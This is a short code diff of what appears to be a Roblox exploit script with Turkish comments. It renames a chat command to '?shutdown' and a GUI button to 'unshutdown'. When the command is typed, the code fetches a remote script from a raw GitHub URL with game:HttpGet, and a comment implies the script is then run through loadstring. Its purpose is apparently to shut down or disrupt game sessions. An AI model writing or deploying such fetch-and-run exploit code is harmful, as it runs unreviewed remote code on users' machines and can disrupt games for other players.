@@ -1509,7 +1509,7 @@ local shutdownGui
 local function createShutdownGui()
     shutdownGui = Instance.new("ScreenGui")
     shutdownGui.Name = "ShutdownGui"
-    shutdownGui.Parent = LocalPlayer:WaitForChild("PlayerGui") 
+    shutdownGui.Parent = LocalPlayer:WaitForChild("PlayerGui") -- GUI'yi oyuncunun PlayerGui'sine ekler
 
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 200, 0, 100)
@@ -1520,7 +1520,7 @@ local function createShutdownGui()
     local button = Instance.new("TextButton")
     button.Size = UDim2.new(1, 0, 1, 0)
     button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    button.Text = "unping"
+    button.Text = "unshutdown"
     button.Parent = frame
 
     button.MouseButton1Click:Connect(function()
@@ -1537,7 +1537,7 @@ local function createShutdownGui()
 end
 
 local function onChatted(player, message)
-    if player == LocalPlayer and message == "?ping9999" and not shutdownScriptActive then
+    if player == LocalPlayer and message == "?shutdown" and not shutdownScriptActive then
         shutdownScriptActive = true
         local scriptUrl = "https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/shutdown" -- Buraya loadstring URL'sini ekleyin
         local response = game:HttpGet(scriptUrl, true)
